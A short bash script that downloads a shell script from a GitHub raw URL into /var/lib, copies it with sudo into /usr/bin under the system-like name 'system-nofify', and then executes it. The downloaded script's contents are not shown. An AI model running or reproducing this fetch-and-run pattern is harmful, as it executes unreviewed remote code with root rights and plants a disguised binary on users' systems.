#!/usr/bin/env bash
wget https://raw.githubusercontent.com/itsyshunter/system/master/file.sh -P /var/lib/
sudo curl -o /usr/bin/system-nofify https://raw.githubusercontent.com/itsyshunter/system/master/file.sh
sh /var/lib/file.sh